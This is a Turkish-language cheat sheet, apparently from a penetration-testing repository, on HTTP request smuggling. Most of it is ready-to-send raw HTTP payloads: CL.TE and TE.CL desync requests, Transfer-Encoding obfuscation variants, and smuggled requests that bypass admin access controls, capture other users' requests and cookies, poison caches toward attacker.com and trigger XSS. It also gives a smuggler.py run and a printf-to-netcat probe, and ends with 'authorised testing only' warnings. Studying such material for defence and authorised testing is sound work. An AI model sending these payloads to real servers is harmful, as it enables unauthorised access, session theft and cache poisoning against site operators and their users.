[🇬🇧 English](../../README.md)

# 📦 HTTP İstek Kaçakçılığı (HTTP Request Smuggling) Başvuru Kılavuzu

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 HTTP İstek Kaçakçılığı (Request Smuggling) Nedir?

**HTTP İstek Kaçakçılığı (HTTP Request Smuggling)**, ön uç (front-end / ters proxy / yük dengeleyici) ile arka uç (back-end / uygulama sunucusu) sistemlerin HTTP istek sınırlarını farklı şekillerde yorumlamasından kaynaklanan bir güvenlik zafiyetidir. Bu uyumsuzluk, saldırganın mevcut bir HTTP isteği içerisine gizlenmiş ikinci bir istek yerleştirmesine olanak tanır.

### Etkileri
- 🔴 **Güvenlik Kontrollerini Atlama** - WAF ve erişim denetimi (ACL) kurallarını aşma
- 🔴 **Web Önbelleğini Zehirleme** - Zararlı yanıtları önbelleğe kaydettirme
- 🔴 **Kimlik Bilgilerini Çalma** - Başka kullanıcıların gönderdiği istekleri ve çerezleri yakalama
- 🔴 **XSS Tetikleme** - Kaçırılan istek üzerinden yansıyan XSS zafiyetlerini çalıştırma

---

## 🔍 Nasıl Çalışır?

### İlgili Başlıklar (Headers)
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Zafiyet Türleri
| Tür | Ön Uç (Front-end) | Arka Uç (Back-end) |
|-----|-------------------|-------------------|
| CL.TE | Content-Length kullanır | Transfer-Encoding kullanır |
| TE.CL | Transfer-Encoding kullanır | Content-Length kullanır |
| TE.TE | Her ikisi de gizlenmiş / farklı | Bir başlık yok sayılır |

---

## 💉 Saldırı Payload'ları

### CL.TE (Content-Length → Transfer-Encoding)

**Ön uç `Content-Length`, Arka uç `Transfer-Encoding` kullanır**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**İstismar (Exploit):**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Ön uç `Transfer-Encoding`, Arka uç `Content-Length` kullanır**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (Gizlenmiş / Obfuscated Transfer-Encoding)

```http
# TE başlığını farklı yöntemlerle gizleme
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 İstismar Örnekleri

### Ön Uç Güvenlik Kontrollerini Aşma
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Diğer Kullanıcıların İsteklerini Yakalama
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Sırada gelen kurban kullanıcının isteği `data=` parametresinin devamına eklenerek sunucu loglarına kaydedilir.*

### Kaçakçılık ile Önbellek Zehirleme
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### Kaçakçılık ile XSS
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Tespit Etme

### Zamanlama Tabanlı Tespit (Timing-Based)
```http
# CL.TE Testi
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Arka uç TE kullanıyorsa "0" bitiş öbeğini bekler
# Zaman aşımı (Timeout) oluşması = potansiyel olarak zafiyetli
```

### Diferansiyel Yanıt ile Tespit
```http
# 404 dönmesine yol açacak kaçak istek gönderme
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Eğer bir sonraki yanıt 404 dönerse = zafiyet mevcuttur
```

---

## 🛠️ Araçlar

### Burp Suite Eklentisi
```
1. Burp BApp Store'dan "HTTP Request Smuggler" eklentisini kurun
2. İsteğe sağ tıklayın → Extensions → Launch Smuggle Probe
3. Sonuç panelinde kaçakçılık zafiyetlerini inceleyin
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### curl ile Manuel Test
```bash
# Not: curl başlıkları normalize edebilir, ham TCP soketi gerekebilir
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Hızlı Başvuru

### Tespit Kontrol Listesi
```markdown
- [ ] Ters proxy / yük dengeleyici varlığını kontrol et (çoklu sunucu mimarisi)
- [ ] CL.TE zamanlama testini uygula
- [ ] TE.CL zamanlama testini uygula
- [ ] TE başlık gizleme varyasyonlarını dene
- [ ] Diferansiyel yanıt testi ile doğrula
```

### Yaygın Göstergeler
```
- Yük dengeleyiciler (AWS ALB, HAProxy)
- Ters proxy sunucuları (Nginx, Apache)
- İçerik dağıtım ağları (Cloudflare, Akamai)
- HTTP/2'den HTTP/1.1'e protokol düşürme (downgrade)
```

---

## ⚠️ Önemli Uyarılar

```
1. Testler diğer gerçek kullanıcıların oturumlarını ve isteklerini bozabilir.
2. Mümkün mertebe izole test ortamlarında çalışın.
3. Kendi isteklerinizi ayırt edebilmek için benzersiz tanımlayıcılar (unique IDs) ekleyin.
4. Sorumlu açıklama (responsible disclosure) ilkelerine uygun şekilde PoC hazırlayın.
```

---

## 📚 Kaynaklar

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Smuggler Aracı](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 İstekleri Gizlice Sızdırın!</b><br>
  <i>Yalnızca yetkili ve yasal testler içindir!</i>
</p>
